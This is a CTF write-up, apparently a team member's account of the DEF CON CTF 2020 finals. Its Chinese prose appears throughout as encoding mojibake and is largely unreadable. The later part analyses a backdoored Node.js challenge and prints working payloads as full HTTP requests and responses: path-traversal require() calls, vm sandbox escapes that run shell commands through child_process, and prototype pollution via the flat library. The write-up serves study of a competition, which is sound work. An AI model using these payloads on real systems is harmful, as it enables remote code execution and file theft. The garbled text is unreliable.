å°±å¼€æ··äº†ï¼Œäºæ˜¯å°±å°¬ç­‰æ¯”èµ›å¼€å§‹ã€‚ç¬¬ä¸€å¤©æ”¾äº†è²Œä¼¼ä¸¤ä¸ªäºŒè¿›åˆ¶çš„ AWD ï¼Œè¿˜æœ‰ä¸€ä¸ª KOH ï¼ŒKOH ç»™çš„æ˜¯ä¸€ä¸ª 21 ç‚¹çš„æ¸¸æˆï¼Œè·Ÿæ™®é€šçš„ 21 ç‚¹æ¸¸æˆå·®ä¸å¤šï¼Œæœ‰ä¸€ä¸ªåº„å®¶ï¼Œæ‰€æœ‰é˜Ÿä¼éƒ½è¿›è¡Œä¸‹æ³¨ï¼Œè¦ç‰Œè¶…è¿‡ 21 ç‚¹çš„é˜Ÿä¼å°±åœ¨å½“å‰ ROUND ç›´æ¥å‡ºå±€ï¼Œå‰©ä¸‹çš„é˜Ÿä¼ç»§ç»­è¿›è¡Œæ¸¸æˆï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼å†³å‡ºæ¸¸æˆç§¯åˆ†å‰äº”åï¼Œåœ¨å¯¹åº”é˜Ÿä¼çš„ KOH åˆ†æ•°ä¸Šè¿›è¡ŒåŠ åˆ†ã€‚\nä¸€å¼€å§‹æ²¡ä»€ä¹ˆé˜Ÿä¼å¾—åˆ†ï¼Œç”±äºç»™å‡ºçš„æ˜¯ Web åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹å°±å½“ä½œ Web é¢˜æ¥åšäº†ï¼Œå„ç§æµ‹äº†æµ‹ï¼Œç„¶åå‘ç°è™½ç„¶è¿™ä¸ª Web å¹³å°æ˜¯ Flask å¹¶ä¸”å¼€äº† Debug ï¼Œä¸€ä¸ªä¸Šä¼ é”™è¯¯ç›´æ¥è·³åˆ°äº† Debug é”™è¯¯ç•Œé¢ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰æ‰¾åˆ°å…¶ä»–åœ°æ–¹æœ‰æ´å¯ä»¥åˆ©ç”¨æ¥è·å– PIN ç ï¼Œè¿™æ¡è·¯å°±ä½œåºŸäº†ã€‚\nç„¶ååå¤šåˆ†é’Ÿåï¼Œæˆ‘ä»¬æ¸æ¸å‘ç°è¿™ä¸ªå¯ä»¥çœ‹åˆ°å…¨å±€é˜Ÿä¼æ‰€æœ‰äººçš„ä¸Šä¼ æ–‡ä»¶ï¼Œè™½ç„¶æ–‡ä»¶æœ‰ä¸€å®šæ ¼å¼ï¼Œå¹¶ä¸”ç±»ä¼¼ä¸€ä¸ªæŒ‡ä»¤ç±»å‹çš„æ–‡ä»¶ï¼Œè™½ç„¶æˆ‘ä»¬å½“æ—¶çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯å‘ç° A0E åœ¨å¾—åˆ†ä¹‹åï¼Œæˆ‘ä»¬æ‹¿ A0E çš„è¿‡æ¥ç”¨å°±å¯ä»¥ç›´æ¥å¾—åˆ†äº†ï¼ˆ\nåé¢æ‰çŸ¥é“æˆ‘ä¸Šä¼ çš„æ–‡ä»¶æ˜¯ä¿®æ”¹äº†æˆ‘ä»¬æ¯æ¬¡ä¸‹æ³¨çš„ç§¯åˆ†ï¼Œå› ä¸ºåˆå§‹çš„æ—¶å€™æ¯ä¸ªé˜Ÿéƒ½ä¸€æ ·ï¼Œä¸€æ¬¡æŠŠè‡ªå®¶èº«å®¶200ä¸€æ¬¡ä¸‹å®Œï¼Œè€Œè¾“çš„æ¦‚ç‡åˆå¾ˆå¤§ï¼ŒåŸºæœ¬ç«‹é©¬å°±å‡ºå±€äº†ï¼Œç„¶è€Œé€šè¿‡ä¸€å¼€å§‹ç›´æ¥ä¸‹æ³¨ 1 ä¸ªç§¯åˆ†ï¼Œè¿™æ ·å°±å¯ä»¥ç«‹é©¬ç¨³ä½æˆ˜å±€ï¼Œè‡³å°‘å¯ä»¥ä¸ä¼šç«‹é©¬å‡ºå±€å°±å¯ä»¥æ’å‰äº”ä¸Šåˆ†äº†ã€‚äºæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹å°±åœ¨ KOH ä¸Šåˆ†äº†ï¼Œå°±è¿™æ ·é€šè¿‡ KOH å¾—åˆ†ï¼Œæˆ‘ä»¬ç¨³ä½äº†å‰ä¸€å¤©çš„æ’åï¼Œç¬¬ä¸€å¤©çš„å¾—åˆ†ä¹Ÿå°±åŸºæœ¬å…¨éƒ½æ¥è‡ªäº KOH ã€‚\nShift 2 \u0026amp; Shift 3 ç”±äºæ—¶é—´ä¹Ÿæ¯”è¾ƒä¹…è¿œäº†ï¼Œæˆ‘è®°çš„ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œè¿™ä¸¤ä¸ª Shift å°±æ”¾ä¸€èµ·äº†ã€‚ç”±äºä¹‹å‰è²Œä¼¼å¤§å®¶æ²¡æ€ä¹ˆæ‰“ DEFCON QUALS æˆ–è€…è¯´æ‰“äº†çš„å¸ˆå‚…è¿™æ¬¡ Final æ²¡æ‰“ï¼Ÿæˆ‘ä»¬ä¸€å¼€å§‹å¹¶æ²¡æœ‰å‘ç° KOH é‚£ä¸ªé¢˜æ˜¯æ”¹è‡ª DEFCON QUALS Fountain OOO REliving ï¼Œæ˜¯ä¸€ä¸ª Golly ç›¸å…³çš„é€†å‘é¢˜ï¼Œå½“æ—¶çœ‹ QUALS çš„ WriteUp ä¹Ÿæ˜¯ç›¸å½“å´©æºƒçš„ï¼Œç”±äºæˆ‘è¿™ä¸ªå°èœé¸¡æ²¡ä»€ä¹ˆé€†å‘åŸºç¡€ï¼Œè·ŸæŸå¸ˆå‚…ç¡¬ç€å¤´çš®æä¹Ÿæ²¡æ€ä¹ˆæå‡ºæ¥ï¼Œè€Œè¿™ä¸ªè¿˜æ˜¯å‡çº§ç‰ˆï¼Œå½“æ—¶çœ‹è¿™ä¸ªé¢˜ç›®çš„é™„ä»¶å›¾è¿˜æ˜¯ä¸€è„¸æ‡µé€¼çš„ï¼š\n \nåœ¨ Golly ä¸Šçå¼„æ›´æ˜¯ç›¸å½“æ‡µé€¼ã€‚è™½ç„¶é€†å‘å¸®ä¸ä¸Šå•¥ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ¯ä¸ª ROUND éƒ½çœ‹ä¸€çœ‹å„ä¸ªé˜Ÿä¼çš„è¡¨ç°ä»¥åŠç­–ç•¥ï¼Œç„¶åå‘ç°æ„Ÿè§‰ä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ•°å­¦æœŸæœ›é¢˜ï¼ˆï¼Ÿï¼‰ï¼Œæˆ‘å°±å°è¯•ç€ç®—ä¸€ä¸‹æ¯æ¬¡ä¸‹æ³¨å¤šå°‘æ‰èƒ½è®©æˆ‘ä»¬æ¯ä¸ª ROUND å¤§æ¦‚ç‡èƒ½åœ¨ç°æœ‰çš„é˜Ÿä¼ç­–ç•¥ä¸­èƒœå‡ºï¼Œç„¶åé€šè¿‡ä¸æ–­çš„è¯•ä¸æ–­çš„æ”¹ï¼Œåé¢åŸºæœ¬ä¸Šé è¿æ°”èƒ½æ‹¿ä¸‹ä¸å°‘åˆ†ï¼ˆ\nåé¢æˆ‘ä»¬ AWD åˆ†æ•°ä¹Ÿèµ·æ¥äº†ï¼Œæˆªæ­¢åˆ° Shift 2 ç»“æŸï¼Œæˆ‘æˆªäº†ä¸€å¼ å½“æ—¶çš„å›¾ã€‚ï¼ˆçœ‹ç€å½“æ—¶çš„ KOH æ„Ÿè§‰å½“æ—¶è¿æ°”çœŸå¥½\n \nåé¢åœ¨ Shift 3 çš„æ—¶å€™ï¼Œè¿™ä¸ª 21 ç‚¹çš„é¢˜ç›®ä¸€å¼€å§‹æ²¡å¤šä¹…å°±ä¸‹äº†ï¼Œäºæ˜¯æˆ‘åˆå¼€å§‹æ··èµ·æ¥äº†ï¼Œä¹Ÿå°±éšä¾¿çœ‹çœ‹å¹³å°ï¼Œç„¶åçœ‹çœ‹é˜Ÿå‹ä»¬åœ¨å¹²å•¥ï¼Œä¸­é—´è²Œä¼¼æœ‰ä¸€ä¸ª RPG æ¸¸æˆçš„ AWD é¢˜ç›®ï¼Œå½“æ—¶çœ‹ä»–ä»¬ç©èµ·æ¥æ„Ÿè§‰å¾ˆæœ‰æ„æ€ï¼Œå°±æ˜¯å¤§å®¶é€šè¿‡æ“æ§è‡ªå·±çš„è§’è‰²è¿›è¡Œå¯¹åº”çš„æ“ä½œæ‹¿ Flag ï¼Œè€Œä¸”è¿˜æ˜¯å…·æœ‰ä¸€å®šå®æ—¶æ“ä½œæ€§ï¼Œæ€»ä¹‹çœ‹èµ·æ¥ä»–ä»¬åœ¨æ‰“è¿™ä¸ªæ¸¸æˆéå¸¸æœ‰æ„æ€ XD\nç„¶ååé¢åˆæ”¾äº†ä¸¤ä¸ª KOH ï¼Œä¸€ä¸ªæ˜¯éå¸¸ Geek çš„å¼¹çƒæ¸¸æˆï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯å¼€é£èˆ¹æ‰“é£èˆ¹çš„æ¸¸æˆï¼Œä¸¤ä¸ªéƒ½æ˜¯é€†å‘ï¼Œä¹Ÿè®©æˆ‘æ··çš„æ˜¯ç†ç›´æ°”å£®ï¼ˆå¤§é›¾ï¼‰ï¼Œè™½ç„¶æˆ‘æƒ³å°½å¯èƒ½åœ°å¸®å¿™ï¼Œä½†æ˜¯çœŸæ˜¯èœçš„çœŸå®ï¼Œä¹Ÿå°±åˆ°å¤„çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥å¸®å¿™çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼Œæ‹¿å¤–å–ï¼ˆæµ·ç›—è™¾é¥­å¤–å–æ˜¯çœŸå¥½åƒï¼Œæ³¡é¢çœŸé¦™ï¼Œå¥½ä¹…æ²¡åƒæ³¡é¢äº†ï¼Œå‘œå‘œå‘œTATï¼‰\n \n \næ˜¯æˆ‘æœ¬äººæ²¡é”™äº†ï¼ˆ\nåé¢ä¸»åŠæ–¹å…¬å¸ƒäº† 21 ç‚¹çš„ WriteUp: https://github.com/o-o-overflow/dc2020f-casinooo-life-blackjack\nè™½ç„¶æ²¡æ€ä¹ˆçœ‹æ‡‚é€†å‘éƒ¨åˆ†ï¼Œä½†æ˜¯çœ‹èµ·æ¥æˆ‘ä»¬é‚£ä¸ªæ”¹ä¸‹æ³¨åˆ†æ•°çš„åšæ³•æ˜¯è§£æ³•ä¹‹ä¸€ï¼Œå¹¶ä¸”å…¶ä»–è§£æ³•çœ‹èµ·æ¥ä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ã€‚\nShift 4 åœ¨æœ€åä¸€å¤©å¼€å§‹å‡ å°æ—¶ä¹‹åï¼Œä¸»åŠæ–¹ç»ˆäºæ”¾å‡ºäº†ä¸€ä¸ªæœ¬åœºå”¯ä¸€ä¸€ä¸ª Web ï¼Œé¢˜ç›®åœ°å€åœ¨ dc2020f-nooode-public ï¼Œæ•´ä¸ªé¢˜ç›®æˆ‘å¼•ç”¨ PPP å¯¹äºè¿™ä¸ªé¢˜ç›®çš„è¯„ä»·â€”â€”â€œBy the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing silly web problems near the end of the competition, and this year was no exception.â€ï¼ˆæ­¤å¤„é‡‡ç”¨äº†å¼•ç”¨è®ºè¯ï¼Œå¼•ç”¨äº†æ¯”è¾ƒæƒå¨çš„äººå£«å¯¹äºé¢˜ç›®çš„è¯„ä»·ï¼Œå¢åŠ äº†è¯´æœåŠ›ï¼‰\nåŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯ä¸€å¥è¯åœ¨ Nodejs ä¸Šçš„å®Œç¾ä½“ç°ï¼Œäºæ˜¯ä¸€å¼€å§‹å°±æœ‰äººå¼€å§‹ç›´æ¥æ‰“äº†ï¼Œæˆ‘ä»¬ä¹Ÿé©¬ä¸Šå‘ç°äº†è¿™ä¸ª Backdooor ï¼Œäºæ˜¯æˆ‘ä»¬ä¹Ÿå¼€å§‹æ‰“ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ª Backdooor çœŸçš„æ˜¯ silly ï¼Œå¾ˆå¤šé˜Ÿéƒ½è¿…é€Ÿä¿®äº†ï¼ˆé™¤äº† pasten è²Œä¼¼æ²¡äººå‚èµ›ï¼‰ï¼Œåé¢ä¹Ÿå°±æ²¡ä»€ä¹ˆæ‰“æ³•äº†ã€‚åé¢é€šè¿‡æˆ‘ä»¬é˜Ÿé‡Œå·¨å¼ºçš„æŸå¸ˆå‚…ä¸Šäº†ä»–å†™çš„å·¨å¼ºçš„ WAF ï¼Œæˆ‘ä»¬æ‹¥æœ‰äº†å·¨å¼ºçš„é˜²å®ˆèƒ½åŠ›ã€‚\näºæ˜¯å°±è·Ÿ A0E æŸå¸ˆå‚…å°¬èŠäº†ï¼Œ\nBut æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€è½®çªç„¶æˆ‘ä»¬åˆå¯ä»¥æ‰“å¾ˆå¤šé˜Ÿï¼Œçªç„¶å‘ç°ä¸»åŠæ–¹è²Œä¼¼åˆåœ¨æ²¡æå‰é€šçŸ¥çš„æƒ…å†µä¸‹ï¼ˆä¹Ÿå¥½åƒæ˜¯é€šçŸ¥äº†æˆ‘æ²¡æ³¨æ„ï¼‰é‡ç½®äº†å„é˜Ÿä¼çš„ç¯å¢ƒï¼Œæˆ‘ä»¬å‘ç°äº†åˆç«‹é©¬ä¿®äº†ä¸€æ³¢ï¼Œç„¶åå‘ç°æ˜¯åŠ å¼ºäº† Check ï¼Œåªèƒ½æŠŠè¶…å¼ºå¸ˆå‚…å†™çš„è¶…å¼º WAF çæ‰äº†ï¼Œå› æ­¤åˆæ‰äº†ä¸€äº›åˆ†ï¼ˆ\nBut æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è²Œä¼¼æœ‰ä¸€ä¸ªé Web AWD é¢˜ç›®æäº¤çš„ Patch æ²¡é€šè¿‡è€Œä¸»åŠæ–¹æ²¡é€šçŸ¥æˆ‘ä»¬å°±ç«‹é©¬æ–­äº†æˆ‘ä»¬è·³æ¿æœºç½‘ç»œï¼Œå¯¼è‡´å½±å“äº†æˆ‘ä»¬å¤§æ¦‚ä¸¤è½®çš„æ“ä½œã€‚\nWeb åé¢ä¼šå•ç‹¬åšä¸€äº›ç®€å•çš„åˆ†æï¼ŒWeb é¢˜æ¯”è¾ƒè®©æˆ‘æ„å¤–çš„æ˜¯ï¼ŒA0E ä»–ä»¬ä½¿ç”¨çš„æ˜¯é»‘åå•è¿‡æ»¤çš„æœºåˆ¶ï¼Œè¢«æˆ‘ä»¬çš„è¶…çº§å¤§å¸ˆå‚…æ‰‹åŠ¨ç»•äº†ï¼Œæ‰“äº†ä¸¤å›åˆå°±è¢«ä¿®äº†ï¼Œè¿™ä¹Ÿæˆäº†åé¢çš„ä¸€ä¸ªä¼ç¬”ã€‚ï¼ˆæŸä¸ªæ¸£ç”·ç«Ÿç„¶è·Ÿæˆ‘è¯´è¦ç¡äº†å´è¿˜åœ¨çœ‹æµé‡\nStealth Port çš„æµé‡å®˜æ–¹ä¹Ÿå…¬å¸ƒäº†ï¼šhttps://oooverflow.io/dc-ctf-2020-finals/stealth.txt ï¼Œè™½ç„¶çœ‹çš„æœ‰ç‚¹è¿·æƒ‘ï¼Œä¸è¿‡è¿˜æ˜¯å¯ä»¥çœ‹åˆ°æœ€åæˆ‘ä»¬ Web ç¡®å®æ‰“äº†ä»–ä»¬ä¸€æ³¢ã€‚\nåé¢å°æ¦œç„¶ååˆ°ç»“æŸï¼ŒåŸºæœ¬å°±æ²¡æœ‰ä»€ä¹ˆæ“ä½œäº†ï¼Œå°æ¦œå‰æˆ‘çœ‹äº†ä¸€ä¸‹åˆ†æ•°å·®è·ï¼Œæˆ‘è§‰å¾—æˆ‘ä»¬æ˜¯åº”è¯¥è·Ÿ HITCON äº‰ç¬¬ä¸‰ï¼ŒPPP è·Ÿ A0E æŠ¢ç¬¬ä¸€ã€‚\nç»“æŸä¹‹åï¼Œè™½ç„¶çª—å¤–çš„é˜³å…‰æ ¼å¤–çš„åˆºçœ¼ï¼ŒåŒ—äº¬æ—©é«˜å³°ä¼´éšç€æ±½è½¦çš„é¸£ç¬›å·²ç»çº·è‡³æ²“æ¥ï¼Œä½†æ˜¯å®¤å†…æˆ‘ä»¬æ¯”è¾ƒå¹³é™ï¼Œå¤§å®¶éƒ½æ”¶æ‹¾æ”¶æ‹¾ä¸œè¥¿ï¼Œæ¡äº†æ¡åƒåœ¾æ–¹ä¾¿é˜¿å§¨æ‰“æ‰«ï¼Œéšä¾¿èŠäº†èŠçœ‹äº†çœ‹å…¶ä»–é˜Ÿå¯¹äºè¿™æ¬¡æ¯”èµ›çš„åæ§½ï¼Œç„¶åå°±éƒ½å„è‡ªå›å»ä¼‘æ¯äº†ã€‚æˆ‘å›å»åå¼€ç€ DEFCON ç›´æ’­ç­‰äº†å¥½ä¸€ä¼šï¼Œå‘ç°ä»–ä»¬è¿˜æŒºç£¨è¹­çš„ï¼Œé¡ºä¾¿æ´—äº†ä¸ªæ¾¡ï¼Œå›æ¥ç­‰å¾…ç€æ­æ™“æœ€ç»ˆç»“æœã€‚\nåé¢å…¬å¸ƒæ¦œå•ï¼Œå¾—çŸ¥æˆ‘ä»¬æ˜¯æ‹¿åˆ°äº†ç¬¬å››åï¼Œè‡ªå·±å€’ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å¿ƒæƒ…ï¼ŒçŸ¥é“ä¹‹åä¹Ÿå°±æ•´ç†æ•´ç†è¿™ä¸¤å¤©çš„é¢˜ç›®ï¼Œçœ‹äº†çœ‹å¤§å®¶å¯¹äºè¿™æ¬¡æ¯”èµ›çš„è¯„è®ºï¼Œä¹‹åå°±ç¡äº†ã€‚\n \nå€’æ˜¯åœ¨æ­æ™“ä¸€äºŒåçš„æ—¶å€™ï¼Œä¸»åŠæ–¹åº”è¯¥æ˜¯ç‰¹åœ°åšäº†ä¸€ä¸ªåˆ†æ•°åŠ¨æ€å›¾æ¥æ˜¾ç¤ºæœ€åæ¯”èµ›çš„æ¿€çƒˆï¼Œçƒ˜æ‰˜ä¸€ä¸‹ç´§å¼ çš„æ°›å›´ï¼Œæœ€åæ˜¾ç¤º A0E ä»¥ 2 åˆ†çš„ä¼˜åŠ¿é™©èƒœ PPP æ‹¿åˆ°äº†å† å†›ï¼Œä¹Ÿæ„å‘³ç€åˆ·æ–°äº†ä¸­å›½å¤§é™†æˆ˜é˜Ÿåœ¨ DEFCON CTF ä¸Šå–å¾—çš„æœ€å¥½çš„æˆç»©ï¼Œä¹Ÿç®—è°è§è¯äº†ä¸€æ¬¡å†å²å§ XD\nNooode é¢˜ç›®åœ°å€ï¼šhttps://github.com/o-o-overflow/dc2020f-nooode-public ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»åˆ†æå¤ç°ä¸€ä¸‹ã€‚\nWeb é¢˜é—®é¢˜ä¸»è¦æ˜¯åœ¨ public-nooode/routes/config.js æ–‡ä»¶ä¸­å­˜åœ¨ä¸€å¤„ BackDooor\nrouter.post(\u0026#39;/validated/:lib?/:f?\u0026#39;, function(req, res, next) { let config = res.locals.config; if (!req.params.lib) req.params.lib = \u0026#34;json-schema\u0026#34; if (!req.params.f) req.params.f = \u0026#34;validate\u0026#34; let jsonlib = require(req.params.lib) let valid = jsonlib[req.params.f](req.body) if (!valid) { res.send(\u0026#34;validator failed\u0026#34;); return } let p; if (config.path) { p = config.path; } else if (config.filepath) { p = config.filepath; } let data = fs.readFileSync(p).toString() try { data = JSON.parse(data) if (_.isEqual(req.body, data)) res.json(data) else res.send({ \u0026#34;validator\u0026#34;: valid, \u0026#34;data\u0026#34;:data, \u0026#34;msg\u0026#34;: \u0026#34;data is corrupted\u0026#34;}) } catch { res.send({ \u0026#34;validator\u0026#34;: valid, \u0026#34;data\u0026#34;:data}) } }); æ¯”è¾ƒç†Ÿæ‚‰çš„åŒå­¦å¯ä»¥ä¸€çœ¼å°±çœ‹çœ‹åˆ°é—®é¢˜æ‰€åœ¨äº†ã€‚\nç”±äºå®˜æ–¹æä¾›çš„æ˜¯æ•´åœºæ¯”èµ›æ‰€æœ‰çš„æµé‡åŒ…è¿‡å¤§ï¼Œå¹¶æ²¡æœ‰å…·ä½“åˆ†ç±»ï¼Œæ•´ä¸ªæµé‡åŒ…å¤šè¾¾ 200 GB ï¼Œè€Œä¸”å¯¹äº Web é¢˜ç›®æ¥è¯´ï¼ŒåŸºæœ¬å‡ ä¸ªæµé‡åŒ…å°±èƒ½æ‹¿åˆ°å¤§å¤šæ•°çš„ Payload äº†ï¼Œæ‰€ä»¥æˆ‘æ‹¿äº†æˆ‘æ‰‹å¤´ä¸Šå½“æ—¶ä¸‹è½½çš„åŸºæœ¬åˆ†éƒ¨äº†å¤§å¤šæ•°æ—¶é—´æ®µçš„æµé‡åŒ…ï¼Œæå–äº†ä¸€ä¸‹ HTTP æµé‡å¹¶è¿›è¡Œäº†ç®€å•ç»Ÿè®¡å¤„ç†ï¼Œå¹¶æŒ‰ç…§å‡ºç°çš„æ¬¡æ•°è¿›è¡Œäº†ä»é«˜åˆ°ä½çš„æ’åºï¼Œå¾—åˆ°äº†ä»¥ä¸‹çš„ç»“æœï¼š\n \nå¥‡æ€ªï¼Œä¸­é—´å¥½åƒæ··å…¥äº†ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿ï¼ˆ\nå½“ç„¶å…¶ä»–æµé‡åŒ…æˆ–è®¸è¿˜å¯èƒ½å­˜åœ¨ä¸€äº›å…¶ä»–çš„ Payload ï¼Œä½†æ˜¯åŸºæœ¬è¯¥é¢˜æ‰€æœ‰çš„ç‚¹éƒ½åœ¨è¿™äº†ã€‚å¹¶ä¸”æ¯ä¸ªæµé‡åŒ…éƒ½å……æ–¥ç€å¤§é‡çš„åƒåœ¾æµé‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åƒåœ¾æµé‡å¤§èµï¼ŒåŸæ¥ä½ å°±æ˜¯ä¸­å›½æ–‡åŒ–å®£ä¼ å¤§ä½¿ï¼Ÿä¸ç”¨æˆ‘å¤šè¯´å°±çŸ¥é“äº†å§ï¼Œè·ŸæŸä¸ªå¸ˆå‚…æ‰“è¿‡ AWD çš„éƒ½åº”è¯¥çŸ¥é“æ˜¯è°å‘çš„è¿™äº›åƒåœ¾æµé‡ã€‚\n \nRequire ä¸€å¼€å§‹å¤§å¤šé˜Ÿä¼éƒ½æ‰“çš„æ˜¯requireç›´æ¥åŒ…å«çš„ç‚¹ï¼Œç”±äºé¢˜ç›®å¼€äº† debug æŠ¥é”™ï¼Œåœ¨ä½¿ç”¨requireåŒ…å« flag çš„æ—¶å€™ä¼šç›´æ¥æŠ¥é”™å›æ˜¾ flag ï¼Œå¦‚ä¸‹ 000AAA å³ä¸º flag\n\u0026lt;h1\u0026gt;Invalid or unexpected token\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;pre\u0026gt;/flag:1 000AAAA ^^^ SyntaxError: Invalid or unexpected token at wrapSafe (internal/modules/cjs/loader.js:1070:16) at Module._compile (internal/modules/cjs/loader.js:1120:27) at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10) at Module.load (internal/modules/cjs/loader.js:1000:32) at Function.Module._load (internal/modules/cjs/loader.js:899:14) at Module.require (internal/modules/cjs/loader.js:1042:19) at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39) at require (internal/modules/cjs/helpers.js:77:18) at /service/routes/config.js:21:17 at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)\u0026lt;/pre\u0026gt; ä½¿ç”¨è¿™ä¸ªæ€è·¯çš„ payload å°±æœ‰å¾ˆå¤šå˜ç§äº†ï¼Œä¾‹å¦‚ï¼š\n POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1 åŠ ä¸Šä¸€äº› body å†…å®¹ã€æˆ–è€…è¿›è¡Œå…¨ urlencode ã€åˆæˆ–è€…å†è·¯å¾„åé¢åŠ ä¸€ä¸ªè·¯å¾„POST /config/validated/%2Fflag/a HTTP/1.1 POST /config/validated/%2ffl%61g HTTP/1.1 POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1  vm è¿˜æœ‰å°±æ˜¯å¯ä»¥é€šè¿‡å†…ç½®çš„ vm lib ï¼Œç”±äº vm lib é€ƒé€¸å·²ç»è¢«å¼„çƒ‚äº†ï¼ŒåŸºæœ¬èƒ½æ‰¾åˆ°å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ exp ç›´æ¥æ‹¿ flag\nPOST /config/validated/vm/runInNewContext HTTP/1.1 Host: zedd.vv:4017 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/json Content-Length: 160 [\u0026#34;const process = this.constructor.constructor(\u0026#39;return this.process\u0026#39;)(); process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;g\u0026#39;).toString()\u0026#34;] HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 Content-Length: 85 ETag: W/\u0026#34;55-/Dqsanp9FGAj8iXHTLNo/PbZBTc\u0026#34; Date: Tue, 13 Oct 2020 10:52:05 GMT Connection: close {\u0026#34;validator\u0026#34;:\u0026#34;000AAAA\\n\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;treasure\u0026#34;:\u0026#34;data-piece2\u0026#34;},\u0026#34;msg\u0026#34;:\u0026#34;data is corrupted\u0026#34;} åé¢çš„å°±æ˜¯åŸºæœ¬æ˜¯åŸºäº post body çš„å˜å½¢äº†ï¼š\n [\u0026quot;const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;const p = this.constructor.constructor('return this.process')(); p.mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;p = this.constructor.constructor(\\\u0026quot;return process\\\u0026quot;)(); r = p.mainModule.require; fs = r(\\\u0026quot;fs\\\u0026quot;); throw new Error(fs.readFileSync(\\\u0026quot;/flag\\\u0026quot;).toString())\u0026quot;] [\u0026quot;var process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;p = this.constructor.constructor(\\\u0026quot;return process\\\u0026quot;)(); r = p.mainModule.require; fs = r(\\\u0026quot;fs\\\u0026quot;); fs.readFileSync(\\\u0026quot;/flag\\\u0026quot;).toString()\u0026quot;] [\u0026quot;const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;var process = this.constructor.constructor(\\\u0026quot;return process\\\u0026quot;)(); p.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()\u0026quot;] [\u0026quot;this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g')+[]\u0026quot;] [\u0026quot;this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*')+[]\u0026quot;] [\u0026quot;const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /*g').toString()\u0026quot;]  flat POST /config/validated/flat/unflatten HTTP/1.1 Host: zedd.vv:4017 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/json Content-Length: 29 {\u0026#34;__proto__.path\u0026#34;: \u0026#34;/flag\u0026#34;} HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 Content-Length: 35 ETag: W/\u0026#34;23-RVcPh+LK1Ac7n2mAq1KjFd049Xo\u0026#34; Date: Tue, 13 Oct 2020 16:54:07 GMT Connection: close {\u0026#34;validator\u0026#34;:{},\u0026#34;data\u0026#34;:\u0026#34;000AAAA\\n\u0026#34;} è¿™ä¸ªå…¶å®æ˜¯ 7/18 @po6ix æå‡ºäº† flat lib ä¸­çš„ unflatten å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼šhttps://github.com/hughsk/flat/issues/105\nç®€å• debug è·Ÿäº†ä¸€ä¸‹ï¼Œç®€åŒ–äº†ä¸€ä¸‹åŸå‡½æ•°ä»£ç ï¼š\nfunction unflatten (target, opts) { opts = opts || {} const delimiter = opts.delimiter || \u0026#39;.\u0026#39; const overwrite = opts.overwrite || false const transformKey = opts.transformKey || keyIdentity const result = {} //...  Object.keys(target).forEach(function (key) { const split = key.split(delimiter).map(transformKey) let key1 = getkey(split.shift()) let key2 = getkey(split[0]) let recipient = result while (key2 !== 